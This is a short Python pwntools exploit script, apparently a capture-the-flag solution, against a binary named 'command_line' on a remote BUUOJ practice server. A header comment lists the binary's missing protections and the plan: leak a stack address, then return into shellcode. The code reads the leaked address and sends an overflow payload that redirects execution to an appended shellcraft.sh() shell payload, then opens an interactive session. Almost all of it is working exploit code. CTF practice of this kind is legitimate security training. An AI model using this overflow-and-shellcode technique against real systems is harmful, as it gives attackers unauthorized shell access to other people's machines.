'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)

1. get stack address
2. ret2shellcode at stack

remote cant output content
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 28824
filename = "./command_line"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    buf_addr = int(io.recvuntil(b'\n', drop=True), 16)
    payload = cyclic(0x10) + p64(0) + p64(buf_addr + 0x20)
    payload += asm(shellcraft.sh())
    # print(payload)
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
